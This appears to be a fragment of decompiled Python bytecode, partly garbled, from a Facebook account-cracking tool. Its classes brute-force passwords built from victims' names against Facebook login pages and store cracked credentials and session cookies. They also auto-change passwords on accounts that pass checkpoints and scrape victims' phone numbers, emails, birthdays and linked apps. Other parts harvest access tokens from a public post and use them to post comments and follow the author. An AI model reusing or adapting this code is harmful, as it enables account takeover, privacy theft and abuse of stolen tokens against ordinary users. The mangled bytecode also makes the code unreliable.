   )�stttc                 C   s    z	|a |a|aW d S    Y d S �N)r�   r�   r�   )r   rh   ri   Zttar   r   r   r   K  s
   
zsttt.__init__Nr   r   r   r   r   r�   J  r   r�   c                   @   r
   )r�   c                 C   sD  t d7 a dat�� }|j�ddddddd	�� t|�td
 �jd�}|�	dddi�}|d�D ]}t
�|�d�|�d�i� q.t
�||d�� |jd|�d� t
d�}t|jd�}dt�dt|j��v rittd � d|j�� v �rd|jv r�tdt� dt� tt �� t� dt� |� d|� t� d�dd � tdt� t� d!�dd � d S d"�d#d$� |j�� �� D ��}	tdt� dt� d%t� d&t� d'|� d|� t� d(�dd � tdt� t� dt� d)t� d&t� d*t� |	� t� d+�dd � td,d-��|d | d |	 d+ � t||	� t||	� d S d.|j�� v �r�t�dt|��}
|�	dddi�}g d/�}|d�D ]}|�d�|v �r<t�|�d�|�d�i� �q%|jt|�d� td�}t|jd�}d0}d1d$� |�d2�D �}tdt� dt� tt �� t� dt� d'|� d|� t� d�dd � tdt� dt � d3t� d4t� t!|�� t� d5�dd � t!|�d0k�rd6|
v �r�d"�d7d$� |j�� �� D ��}	d8t"v �r�t#|||� d S tdt� t� dt� d9t� d&t� d:t� d+t� dt� d;t� d&t� d*t� |	� t� d+�� t||	� d S d<t�dt|��v �rtdt� t� dt � d=t$� d>t � d?t� d+�� d S tdt� t� t � d@t� dA�� d S t!|�dk�r`t%t!|��D ]-}|d7 }t�dBt|��}tdt� t� dt� |� t� d>t� d�|�� dCt� d+�dd � �q,td� d S t!|�dDk�r�t%t!|��D ]/}|d7 }t�dEt|| ��}tdt� t� dt� |� t� d>t� d�|�� dCt� d+�dd � �qmtd� d S d|j�� v �r�d"�dFd$� |j�� �� D ��}	tdt� dt� d%t� d>t� |� d|� d|	� t� d(�dd � td,d-��|d | d |	 d+ � t||	� t||	� d S d S tdt� dt� tt �� t� dt � |� d|� t� �� tdt� t� t � dGt$� d+�� d S )HNr:   rJ   �mbasic.facebook.com��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�gzip, deflatezid-ID,id;q=0.9�https://mbasic.facebook.com/rD   )�Host�accept�accept-encoding�accept-language�referer�
user-agent�/login/?next&ref=dbl&fl&refid=8�html.parserr�   �method�postr2   rp   �value��email�pass�action�r�   zTemukan Akun Anda�\<title>(.*?)<\/title>z-Hidup Matikan Mode Pesawat, Selama 2 Detik !!�c_userzAkun Anda Dikuncir8   r"   z] Checking Account Options : r�   z		
r^   r�   z%This account has a new session					

�;c                 S   �   g | ]
\}}d ||f �qS �z%s=%sr   ��.0�keyr�   r   r   r   �
<listcomp>o  �    z%cek_opsi.__init__.<locals>.<listcomp>r�   �]ru   z	        
�   ✓z	 Cookie: r   �Hasil/Akun-Tap-Yes.txtr�   �
checkpoint)�fb_dtsg�jazoest�checkpoint_data�submit[Continue]�nhr   c                 S   s   g | ]}|�qS r   r   )r  �cekr   r   r   r    s    �option�!z] There is z Options :	
z.Lihat detail login yang ditampilkan. Ini Anda?c                 S   r�   r   r   r  r   r   r   r  �  r  r)   u   √z& Congratulations This Account Tap Yes r#   z%Masukkan Kode Masuk untuk Melanjutkan�   ×r$   zAccount A2F On            z#There is a problem with the accountz     		
z3\<option selected=".*?" value=".*?">(.*?)<\/option>z			rY   z"\<option value=".+">(.+)<\/option>c                 S   r�   r   r   r  r   r   r   r  �  r  zwrong password !          )&r�   �url�req�Session�headers�update�parr�   r�   �findr�   r�   �re�findall�strr�   r3   �cookies�get_dictr>   r<   r=   r�   �join�itemsr�   r�   r   �	get_infoo�cek_apk�data2�find_allrB   r�   r�   �ubah_pw�Pr�   )r   r�   r�   �sessionZsoupZlinkr-   ZurlPost�response�coki�title�link2Z	listInput�an�	response2Znumberr  Zopsir   r   r   r   T  s�   �
:68$
�<2

R0"@@:$
�Vzcek_opsi.__init__Nr   r   r   r   r   r�   S  r   r�   c                   @   r
   )r%  c                 C   s�  i i }}g d�}|d�D ]}|� d�|v r#|�|� d�|� d�i� q|jt|� d� |d�j}t|d�}	|	�dd	d
i�}
g d�}dt�dt	|��v r�|	d�D ]}|� d�|v rf|�|� d�|� d�i� qP|�dd�
t�i� |jt|
� d� |d�}d�
dd� |j�� �� D ��}tdt� t� t� dt� dt� dt� dt� dt� t� t� dt� dt� dt� dt� dd�
t�� d|� t� d�dd� tdtd�
t�d� tdd��td d�
t� d | d � d|vr�t||� t||� d S td� d S d S ) N)zsubmit[Yes]r  r
  r  r  r2   rp   r�   r�   r�   r�   r�   r�   r�   )zsubmit[Next]r  r
  r  zBuat Kata Sandi Barur�   Zpassword_newr^   r�   c                 S   r�   r   r   r  r   r   r   r  �  r  z$ubah_pw.__init__.<locals>.<listcomp>r8   r"   r  r  z THIS ACCOUNT TAP YESr   ru   r�   r�   �TAPr  r�   r	  )r�   r  r�   r  r�   r  r  r  r  r  r  r�   r  r  r   r�   r�   r>   r�   r�   r[   r�   r   r!  r"  )r   r'  r(  r+  ZdatZdat2Zbutr-   ZubahPwZresUbahZlink3Zbut2�br,  r)  r   r   r   r   �  s0   
�
�p* �zubah_pw.__init__Nr   r   r   r   r   r%  �  r   r%  c                   @   r
   )r!  c                 C   s*  |j dd|id�j}t�dt|��d }|j dd|id�j}|j dd|id�j}|j dt� d	�d|id�j}|j d
t� d�d|id�j}zt�dt|��d }	W n   d}	Y zt�dt|��d �dd�}
W n   d}
Y zt�dt|��d }W n   d}Y zt�dt|��d }W n   d}Y zt�dt|��d }W n   d}Y zd}t�dt|��}|D ]}||d 7 }q�W n   Y td�g t	� �t	� �d�t
� �d�t� �d�t� �|� �t� �d�t	� �t	� �d�t
� �d�t� �d�t� �|� �t� �d�t	� �t	� �d�t
� �d�t� �d�t� �|� �t� �d�t	� �t	� �d�t
� �d�t� �d�t� �|
� �t� �d�t	� �t	� �d�t
� �d�t� �d�t� �|	� �t� �d�t	� �t	� �d�t
� �d�t� �d�t� �|� �t� �d�t	� �t	� �d�t
� �d�t� �d �t� �|� �t� ��� d S )!N�'https://mbasic.facebook.com/profile.php�cookie�r  �\<title\>(.*?)<\/title\>r   �.https://mbasic.facebook.com/profile.php?v=info�1https://mbasic.facebook.com/profile.php?v=friendsr�   ��/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_�Fhttps://mbasic.facebook.com/timeline/app_collection/?collection_token=�#%3A184985071538002%3A32&_rdc=1&_rdr�=\<a\ href\="tel\:\+.*?">\<span\ dir\="ltr">(.*?)<\/span><\/a>r^   �W\<a href\="https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?" target\=".*?"\>(.*?)<\/a\>�&#064;r7   �h\<\/td\>\<td\ valign\="top" class\=".*?"\>\<div\ class\=".*?"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>�+\<h3\ class\=".*?"\>Teman\ \((.*?)\)<\/h3\>�%\<span\ class\=".*?"\>(.*?)\<\/span\>r:   �%\<div\ class\=".*?" id\="year_(.*?)">�, r"   r  �] Account Name       : r   �] Friends Number    : z] Number of Followers : �] Active Email     : �] Active Number     : �] Account Year      : �] Birthday   : )r�   r�   r  r  r  r�   r�   r�   r  r�   r�   r&  r=   )r   r'  r)  �get_idr�   r(  r-  �	response3�	response4�nomerr�   r�   �teman�pengikut�tahun�cek_thn�nenenr   r   r   r   �  s2   "��� zget_infoo.__init__Nr   r   r   r   r   r!  �  r   r!  c                   @   r
   )r"  c                 C   s  d\}}|j dd|id�j}|j d|dd�d�j}dt�d	t|��v r�tt� t� t� d
�� d|v r@tt� t� t� t� d�� nMtt� t� t� t� d�� t�dt|��}t�dt|��}|D ]-}	|d7 }tt� t� t� t� t� dt	� |� t� dt
� |	� dt	� || � t� �� |d7 }q_d|v r�tt� t� t� t� d�� n]d\}}tt� t� t� t� d�� t�dt|��}
t�dt|��}|
D ]-}	|d7 }tt� t� t� t� t� dt	� |� t� dt� |	� dt� || � t� �� |d7 }q�ntt� t� t� d�� td� d S )NrI   �<https://mbasic.facebook.com/settings/apps/tabbed/?tab=activer1  r2  �>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive�yMozilla/5.0 (Linux; Android 10; CPH2179) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36�r1  r�   �Diakses menggunakan Facebookr3  zRelated Apps*�AAnda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.zNo Active Apps Associated *zActive Apps*�;\/><div\ class\=".*?"\>\<span\ class\=".*?"\>(.*?)<\/span\>�2\<div\>\<\/div\>\<div\ class\=".*?"\>(.*?)<\/div\>r:   r"   r$   ru   �FAnda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjauz-Tidak Ada Aplikasi Kedaluwarsa Yang Terkait *zExpired Apps*�Cookies Error !r^   )r�   r�   r  r  r  r�   r�   r3   r>   r<   r�   r=   r?   rB   )r   r'  r)  �hit1�hit2r  �cek2�apkAktif�ditambahkan�muncul�apkKadaluarsa�
kadaluarsar   r   r   r   �  s6   F
F
�zcek_apk.__init__Nr   r   r   r   r   r"  �  r   r"  c                   @   r
   )�cek_cookies_by_riskyc           "      C   s  d}|}|}t �� }|}|�dd�}d}	|�d| d d�}|�d| d d�}|�d| d�}|�d| d�}|	|7 }	|	d7 }	|	d7 }	|	|7 }	|	}
|jdd|
id�j}d	t�d
t|��v �r�|jdd|
id�j}t�d
t|��d }|jdd|
id�j}|jdd|
id�j}|jd|� d�d|
id�j}|jd|� d�d|
id�j}zt�dt|��d }W n   d}Y zt�dt|��d �dd�}W n   d}Y zt�dt|��d }W n   d}Y zt�dt|��d }W n   d}Y zt�dt|��d }W n   d}Y zd}t�dt|��}|D ]	}||d 7 }�qW n   Y |d�g t	� �t	� �d�t
� �d�t� �d�t� �|� �t� �d �t	� �t	� �d�t
� �d�t� �d!�t� �|� �t� �d �t	� �t	� �d�t
� �d�t� �d"�t� �|� �t� �d �t	� �t	� �d�t
� �d�t� �d#�t� �|� �t� �d �t	� �t	� �d�t
� �d�t� �d$�t� �|� �t� �d �t	� �t	� �d�t
� �d�t� �d%�t� �|� �t� �d �t	� �t	� �d�t
� �d�t� �d&�t� �|� �t� �d ��7 }d'\}}|jdd|
id�j}|jd(d|
id�j}d	t�d
t|��v �r�|t	� t	� t� d)�7 }d*|v �r6|t	� t	� t	� t� d+�7 }nO|t	� t	� t	� t� d,�7 }t�d-t|��}t�d.t|��}|D ]/}|d7 }|t	� t	� t	� t	� t� dt� |� t� d/t
� |� d0t� || � t� d �7 }|d7 }�qUd1|v �r�|t	� t	� t	� t� d2�7 }ndd'\}}|t	� t	� t	� t� d3�7 }t�d-t|��} t�d.t|��}!| D ]/}|d7 }|t	� t	� t	� t	� t� dt� |� t� d/t� |� d0t� |!| � t� d �7 }|d7 }�q�n|d4t	� t	� t� t� d5�7 }n	 t|d  | � d S )6Nr^   �
noscript=1�c_user=r�   �;c_user=rP  r1  r2  rT  r3  r0  r   r4  r5  r�   r6  r7  r8  r9  r:  r;  r7   r<  r=  r>  r:   r?  r@  r"   r  rA  r   rB  z] Fillowers Of Number : rC  rD  rE  rF  rI   rQ  zAplikasi Yang Terkait*
rU  z(Tidak Ada Aplikasi Aktif Yang Terkait *
zAplikasi Aktif*
rV  rW  r$   ru   rX  z.Tidak Ada Aplikasi Kedaluwarsa Yang Terkait *
zAplikasi Kedaluwarsa*
r8   zCookies Error !
)r  r  r�   r�   r�   r  r  r  r  r�   r�   r&  r=   r3   r>   r<   r?   rB   r�   )"r   rh   rj   Zmemek_mamak_yayanZ
kntl_yayanr�   Zakun_nnr'  �	kukis_sus�kukis_imposr)  r  rG  r�   r(  r-  rH  rI  rJ  r�   r�   rK  rL  rM  rN  rO  rZ  r[  r\  r]  r^  r_  r`  ra  r   r   r   r   �  s�   "��� 
H
H�zcek_cookies_by_risky.__init__Nr   r   r   r   r   rb  �  r   rb  c                   @   r
   )�
log_hasillc                 C   s�  d}d}t �� }|j�ddd|dddd	d
ddd|d ddd�� i }t|j|d dtid�jd�}|�dddi�}	g d�}
|	�	d�D ]}|�d�|
v rY|�|�d�|�d�i� qBqB|�||d�� zt|j
||	�d� |dd�jd�}W n t jjy�   |td  t d! 7 }Y nw d"|jv r�|td# 7 }n�d$|jv �r1|�d�}|�ddd%i�d }|�ddd&i�d }|�ddd'i�d }||||dd(|d)�}t|j
||d  |d*�jd�}d+d,� |�	d-�D �}tt|��d.k�r
|td/ t d! 7 }td0d1��d2�||�� td3||d4� n
|d5tt|�� 7 }tt|��D ]}|d6t|d7 � d8 ||  d! 7 }�qn'd9t|�v �rN|�d:d;d9i��d:�j}|d<t|tf 7 }n
|td= t d! 7 }td>t t | d? | d@ | t d! t | dA dBdC� d S )DNr^   rJ   r�   �	max-age=0rw   �!application/x-www-form-urlencodedz�Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36z|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gp�same-origin�navigate�?1�documentr�   r�   �#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�r�   �cache-control�upgrade-insecure-requests�origin�content-typer�   r�   �x-requested-with�sec-fetch-site�sec-fetch-mode�sec-fetch-user�sec-fetch-destr�   r�   r�   r�   �r  r�   r�   r�   r�   )�lsdr  Zm_ts�liZ
try_numberZunrecognized_triesr�   Zbi_xrwhr2   rp   r�   r�   r�   T�r�   Zallow_redirectszThis Account Is Spam !!r   r�   z"This Account Doesn't Check Points
r	  r
  r  r  Z	Lanjutkan)r
  r
  r  r  r  r  r  r�   c                 S   s   g | ]}|j �qS r   )r�   )r  Zyyr   r   r   r  �  s    z'log_hasill.__init__.<locals>.<listcomp>r  r�   zThis Account Yess (Tap Yes)zHasil/Akun_Tap_Yes.txt�a+z{}|{}
r.  r%   zAvailable %s Options 
z      r:   z. Zlogin_errorZdiv�idz%s%s%s
zPassword Has Been Changed !r8   r�   z | z            z >>KIKYr�   )r�   r  r  r  r  r�   �uar�   r  r$  r�   �
exceptions�TooManyRedirectsrB   r>   r  r�   r  r�   r�   r   �formatr[   r�   r?   r�   r3   r=   )r   r�   ZpaswZttllZlpZhostZsesr�   ZgedZfmr;   �i�runr�   ZdtsgZjzstr  ZdataDZxnxxZngewZoptZohr   r   r   r   M  s�   �&�

�	(�@zlog_hasill.__init__Nr   r   r   r   r   rh  L  r   rh  c                   @   r
   )�	dump_namec                 C   sZ   t �� }d}|j|d|id�}t|jd�}|jddd�}|j}t|� tdd	��	|� d S )
Nz2https://mbasic.facebook.com/search/people/?q=Riskyr1  r2  r�   r�   r�   )r�   ztes.pyrG   )
r�   r  r�   r  �contentr  r�   r�   r�   r   )r   ZkukisZses_r  Zdat_gameZdatagameZform_Zdata_texr   r   r   r   �  s   zdump_name.__init__Nr   r   r   r   r   r�  �  r   r�  c                   @   r
   )�	gabung_pwc                 C   s�   d}d}d}d}t dt d � t td � ttd ��d�}tdd	�}|D ]$}t|�d
kr9|d| 7 }|d7 }q&|d| 7 }|d7 }|�|d � q&|��  |dkrTnt td t t	|� t
 d � |dkrjd S t td t t	|� t
 d � d S )Nr^   r   r   zUse a comma as separatorz%Example Pass : 786786,pakistan,102030r�   �,�.pawwrG   r�   ru   r:   r�   z	There is z Unusable Password !z	There Is z Unusable Password !
)r   r3   r2   r�   r�   r�   r   �closerB   r  r>   r�   )r   �pqZbqZvvZcc�pawZpakQ�nr   r   r   r   �  s(   


 $zgabung_pw.__init__Nr   r   r   r   r   r�  �  r   r�  c                   @   r
   )�	cek_konekc                 C   sP   zt �d�}W d S  t jjy'   tj�dt� d��f tj��  t	�  Y d S w )Nz|https://www.google.com/search?q=jmbf&oq=jmbf&aqs=chrome..69i57j69i60j0i512l3j0i30l3.1092j0j1&sourceid=chrome-mobile&ie=UTF-8r8   zYour Network Is Disconnected !!)
r�   r�   r�  r   r   r   r   r3   r   r�  )r   Zcek_jaringanr   r   r   r   �  s   

�zcek_konek.__init__Nr   r   r   r   r   r�  �  r   r�  rn   c                   @   r
   )�
buat_angkac              	   C   s  t dd�}t�  ttt d t � ttd t d t � ttd �}|dks,|dkr6ttd	 � t�  n;z!|�	d
�}|D ]}zt dd��
tt|��d � W q>   Y q>W n   zt dd��
tt|��d � W n   Y Y t dd��� }|dv r�ttd � t�  d S d S )N�.paskarG   z?Enter a number for the password, and use a comma as a separatorz
Example : z123,1234,12345zEnter Number : r^   ru   zDon't Empty Cockr�  r�   r�   rX   )r^   ru   z  z   zEnter Numbers, Not Letters :()r�   r�   r   r3   rB   r>   r<   r2   r�  r�   r   r  r�   r�   )r   Zkontol_hakikiZpaskar�  Zhakiki_kntlr   r   r   r   �  s2   

 
� �
�zbuat_angka.__init__Nr   r   r   r   r   r�  �  r   r�  c                   @   r
   )�generateoldc                 C   s  g }znt �d| d t �}t�|j�}|d }|�d�D ]P}|�� }t|�dkrD|�	|� |�	|d � |�	|d � |�	|d � q|�	|� |�	|d � |�	|d � |�	|d � |�	d	� |�	d
� |�	d� qW |S    |�	d	� |�	d
� |�	d� Y |S )N�https://graph.facebook.com/�?access_token=rp   ru   �   �123�1234�12345Z123456Z	123456789Zkhankhan)
r�   r�   �pln_tknr�   r�   r�   r�   �lowerr�   r�   )r   �idt�results�jok�opr�   r�  r   r   r   r   �  s4   



��

zgenerateold.__init__Nr   r   r   r   r   r�  �  r   r�  c                   @   r
   )�generatec           
   
   C   s�   g }|}|� d�}z	tdd��� }W n   d}Y ztdd��� � d�}|D ]}t|�dkr3|�|� q&W n tyG } zW Y d }~nd }~ww |�� }|� d�}	|�|	d � |�|	d d	 � |�|	d d
 � |�|	d d � |�|� |S )Nru   �.passrX   �KOSONGr�  r�   r�   r   r�  r�  r�  )r�   r�   r�   r�   r�   r�   r�  )
r   r�   r�  Zkiky_gg_gtg�qz�sjr�  r�  r   �kikar   r   r   r      s2   

��� 

zgenerate.__init__Nr   r   r   r   r   r�  �  r   r�  c                   @   r
   )�generatekotolc                 C   s
  g }|� � }|}|� � }z	tdd��� }W n   d}Y |�d�}|�d�D ]}|� � }|D ]	}|�|| � q.q&|�d�}|D ]}|�|d | � q@|�|� z	tdd��� }W n   d}Y ztd	d��� �d�}	|	D ]}
t|
�d
kr{|�|
� qnW |S    Y |S )Nr�  rX   z123|1234|12345r�   ru   r   r�  r�  r�  r�   )r�  r�   r�   r�   r�   r�   )r   Zn__aZbocil_alok_bersatu_melawan_pubgr�   Zdmi__gtgr�  ZnolepZnama_tt_r�  r�  r�  r   r   r   r     s8   
�


���zgeneratekotol.__init__Nr   r   r   r   r   r�    r   r�  r)   c                   @   sL   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d
� Zdd� Zdd� Z	dd� Z
dS )r�   c                 C   s
   g | _ d S r�   �r�  )r   �isifiler   r   r   r   8  s   
zcrackmenu.__init__c                    s�   z|� _ t� j ��� �� � _W n   ttd � t�d� t	�  Y ddkr>t
td � tdt d �}t
dtt|f � q&d S )	N�File Not Found! Try AgainrY   ZKIKY_GTGTz,Example Password : Pakistan,123456,123456789r   �Enter Password : �%sPassword Used : %s%s)�apkr�   r�   �
splitlinesr�  r�   r3   r   r   rl   r   r2   r�   r�   r�   r�   �pro_sesr�   )r   r�  �pwx�mobile_nr   �r   r   �crackold:  s   $0�zcrackmenu.crackoldc                 C   s�   t d� t tt d � t tt d � t td t d t t�� �d� t d � ttd t d	 t	 d
 t
 d t t d t d t
 d t � d S )Nr   z5[1;92mIf there is an error, please report to admin !z:If No Result Turns On Turn Off Airplane Mode For 5 Secondsz'Crack Process is Running Please Wait : r"   r9   r  z'On Turn Off Airplane Mode If No Result
z$Crack Results That CP Is Saved In : z
Result/CP-z.txt
z Crack Results are OK Saved In : z
Result/OK-z.txt

)r   r3   rB   r>   r<   r   r@   rA   r�   r=   �durasir�   r�  r   r   r   r�  K  s   �zcrackmenu.pro_sesc                 C   �^   t dt t d � t tt d � ttd t d t d t d t d � t�d	� d S )
Nr   �#[1;92mPlease Select Login Method !�DPlease try one by one, don't forget to turn on and off airplane modez[1;92m[1] Mobile V1 �Pro� ( Fast Crack  ) ( �Recommended�  )
�{�G�z�?�	r   r3   rB   r�   r>   r<   r�   r   r   r�  r   r   r   �
menu_crackN  �   $:zcrackmenu.menu_crackc                 C   r�  )
Nr   r�  r�  z[1] Mobile V1 r�  r�  r�  r�  r�  r�  r�  r   r   r   �menu_crack_mQ  r�  zcrackmenu.menu_crack_mc                    s�  z|� _ t� j ��� �� � _W n   ttd � t�d� t	�  Y tdd�}tdt d � t
td �}|dv r@ttd
 � q9|dv r�� ��  t
td �}|dkrfttd � t�d� t|��|� d S |dksn|dkrx� ��  � ��  d S ttd � t�d� t|��|� d S |dv r�t�  � ��  t
td �}|dkr�ttd � t�d� t|��|� d S |dks�|dkrǈ ��  � ��  d S ttd � t�d� t|��|� d S ttd � t�d� t|��|� d S )Nr�  rY   r�  rG   �

z([1;92mPlease Choose Password Tyep-(D) ?�Select One: )�mrB   ZManualr�   Tz"Example Password : khankhan,123456r   r�  r�  r^   zFill Password Correctly !!r�   zPassword Minimal 6 Latter !!zSelect One :zFill it up correctlyr:   rw   rK   c                    s�   t dd��1}� jD ]}z|�d�d }|�� j|| � W q	   Y q	t�� j� tt	d � W d   � d S 1 s9w   Y  d S )N�#   r�   �<=>r   �Done !!)
r�   r�  r�   �submit�mobile_r+   �remover�  r	   r3   )Zzscr�   �uidZuseridr�  r   r   r�  m  s   
$
"�z$crackmenu.passmenu.<locals>.mobile_nr�  )�d�DZDefault�default)�G�gZGabungZgabungZgabunganzFill Correctly !)r�  r�   r�   r�  r�  r�   r3   r   r   rl   r2   r�   r   r�   r�   r�  r�   r�   r�  r�   r�  �KangCOLMEXXXr�  )r   r�  ZcjjZzkr�  Zjmr�  r   r�  r   r�   U  s0   $
0(0((zcrackmenu.passmenuc                 C   s  |D �]a}|� � }t�� }|j�dddddddddd	d
ddd�� |�d�j}t�dt	|���
d�t�dt	|���
d�|d|dd�}|j�dddddddddddd	dddd�� |jd|dd�}d|j�� v r�d�d d!� |j�� �� D ��}d"|||f }	t�|	� td#t d$ d%��d&|	 � d'tttt|||f }
td(� d)d)kr�t|||
� nt|
� zt|||� W n   Y  n�d*|j�� v �rdzXtd+��� }t�d,||f ��� d- }|�d.�\}}}t| }td/tttt|||||f	 � td(� d0|||||f }	t �|	� td1t d$ d%��d&|	 � t!d2||d3� W  nG t"t#f�y/   d3}d3}d3}Y n   Y td4tt$tt$t%f � td(� d5||f }	t �|	� td1t d$ d%��d&|	 � t!d2||d3�  nqt&d7 a&t'j(�d6tt)t*�+� �,d7�tt&t-| j.�t-t�t-t �tf	 �f t'j(�/�  d S )8Nzm.facebook.comrw   z�Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]r�   rk  Znonerm  rn  ro  z https://developers.facebook.com/r�   rp  )r�   rs  r�   r�   Zdntrv  rw  rx  ry  rz  r�   r�   r�   zlhttps://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2Fzname="lsd" value="(.*?)"r:   zname="jazoest" value="(.*?)"Zlogin_no_pinz8https://developers.facebook.com/tools/debug/accesstoken/)r|  r  r�  Zflowr�   �nextri  zhttps://m.facebook.comrj  z�Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36rl  rq  zChttps://m.facebook.com/login/device-based/validate-password/?shbl=0Fr~  r�   r�   c                 S   s   g | ]
\}}|d  | �qS )r�   r   r  r   r   r   r  �  r  z%crackmenu.mobile_.<locals>.<listcomp>z%s|%s|%s�	Hasil/OK-z.txtr�   z%s
z.[1;92m%s[%sOK%s]%s %s|%s|%s                 r0   r)   r	  rn   z=https://graph.facebook.com/%s?fields=birthday&access_token=%sZbirthday�/z#%s[%sCP%s]%s %s|%s|%s %s %s       z%s|%s|%s %s %s�	Hasil/CP-ZAJGr^   z+[1;91m%s[%sCP%s]%s %s|%s                 z%s|%sz %s[%s%s%s] %s/%s OK:%s CP:%s %sr9   )0r�  r�   r  r  r  r�   r�   r  �searchr  �groupr�   r  r  r  r   �okr�   r�   r�  r   r>   r�   r(   rb  r�   rg   r�   r�   r�   �	bulan_ttlr=   �cpr[   �KeyError�IOErrorrB   �u�loopr   r   r<   r   r@   rA   r�   r�  r   )r   r�   Z	kiky__gtgr�   r'  �pZdataaZpor)  ZwrtZzczcZkontolZcp_ttl�month�day�yearr   r   r   r�  �  s:   
(6,
�"b<zcrackmenu.mobile_c                 C   sh  t dd���}| jD ]�}z�|�d�}|d �d�}|d }z	tdd��� }W n   d}Y z!td	d��� �d
�}|D ]}t|�dkrK|�| j|d |� q9W n ty_ }	 zW Y d }	~	nd }	~	ww |�	� }|�d�}
|
d |
d d |
d d |
d d |g}|�d�}|�| j|d |� W q	   Y q	t
�| j� tdt d � W d   � d S 1 s�w   Y  d S )Nr�  r�   r�  r:   ru   r�  rX   r�  r�  r�   r�   r   r�  r�  r�  r�  zCrack Finish)r�   r�  r�   r�   r�   r�   r�  r�  r�   r�  r+   r�  r�  r	   r3   )r   r�   �uname�zzr�  r�   r�  r�  r�  r   r�  Zpww_r   r   r   r�  �  s4   

��� 
*

"�zcrackmenu.KangCOLMEXXXN)r   r   r   r   r�  r�  r�  r�  r�   r�  r�  r   r   r   r   r�   7  s    6#r�   c                   @   r
   )r�   c                 C   s�   t td � t td � ttd �}|dv rttd � d S |dv r:ttd � t�d� t�d	� ttd
 � d S ttd � t�d� t	dd�}|�
|� |��  ttd � d S )NzEnter your User Agnet !!z6Type * def * for Default User Agent Settings Script !!zUser Agent : rt   zDon't be empty)ZDEF�defz* def *ZDefz,OK, User Agent has been successfully setup !r:   z
rm -rf .uaz"Run Script Again : python Multi.pyrW   rG   z!Run Script Again : python ./Multi)r   r3   r2   r�   r   r   r+   r�   r	   r�   r   r�  )r   Zuqr    r   r   r   r   �  s    




zganti_ua.__init__Nr   r   r   r   r   r�   �  r   r�   c                   @   r
   )r�   c                 C   s�   t �d� tt� td� td� td� td� td� td�}|dv r*t�  d S |d	v r3t�  d S |d
v r<t�  d S tt	d � t
�d� t�  d S )Nrm   z.
[1;92mSorry.. Before Continue Please Login !z[1;92mSelect Login Method !r'   z[1] Login With Tokenz[2] Login With Cookiesz[1;92mSelect One :)rw   rK   rf   )ry   rL   Zcokies)ZautozFill In Correctlyr:   )r+   r�   r�   r�   r   r2   rf   �coke�
auto_tokenr3   r   r   r�   )r   Zh_r   r   r   r   �  s   



 zlogin.__init__Nr   r   r   r   r   r�   �  r   r�   c                   @   r
   )r�  c           
      C   s�   d}d}t �d�}t|jd�}t�d|j�}|D ]Z}|d7 }t|�dkrr|}tt	d t
|� � d}d	}	t �d
| d | d | � t �d
|	 d | d | � t �d| � t �d| � t �d| � t �d| � t|� qtt	d � d S )Nr   zVhttps://free.facebook.com/story.php?story_fbid=213614107297063&id=100059454248601&_rdrr�   zEAA\w+r:   �%   z	Token  : �3105954929648426�3048075795436340r�  �/comments/?message=�&access_token=�Dhttps://graph.facebook.com/100007018489471/subscribers?access_token=zToken Not Found)r�   r�   r  r�  r  r  r�   r�   r�   r3   r  r�   �	cek_tokenr	   )
r   r�   ZbiZ
link_tokenZgblZ
token_freeZnaarf   �post4�post5r   r   r   r   �  s*   
�zauto_token.__init__Nr   r   r   r   r   r�  �  r   r�  c                   @   r
   )rf   c                 C   s�   t d�}z+t�d| �}t�|j�}|d }tdd�}|�|� |��  t	t
d � t�  W d S  tyG   t	t
d � t�d� t�  Y d S w )	Nz[1;92mEnter Token : z+https://graph.facebook.com/me?access_token=rp   rn   rG   zLogin Successful�Token InvalidrY   )r2   r�   r�   r�   r�   r�   r�   r   r�  r�   r3   �
bot_followr�  r   r   rf   )r   r�   r�   r�   r�   Zzeddr   r   r   r     s   X0ztoken.__init__Nr   r   r   r   r   rf     r   rf   c                   @   r
   )�check_kukisc                 C   s�   t �� }z	tdd��� }W n   t�  Y |jdd|id�j}t�dt	|��d }d|v rGt
td	 � t�d
� zt�d� W d S    Y d S 	 d S )N�
.cokie.txtrX   r0  r1  r2  r3  r   zHalaman Tidak DitemukanzSorry Your Cookies Are Deadr:   )r  r  r�   r�   r�  r�   r�   r  r  r  r   r3   r   r   r+   r�  )r   r'  r)  ZresponZnama__r   r   r   r   	  s   zcheck_kukis.__init__Nr   r   r   r   r   r�    r   r�  c                   @   r
   )r�  c              
   C   s�   t td t �}|d| 7 }zAddddddd	d
|d�	}tjt|d�}t�d|j�}|�	d�}d|v rNt
dd��d| � t
dd��d| � t|� t|� W n ttjjfyj   ttd � t�d� t�  Y nw tttd �� d S )Nz
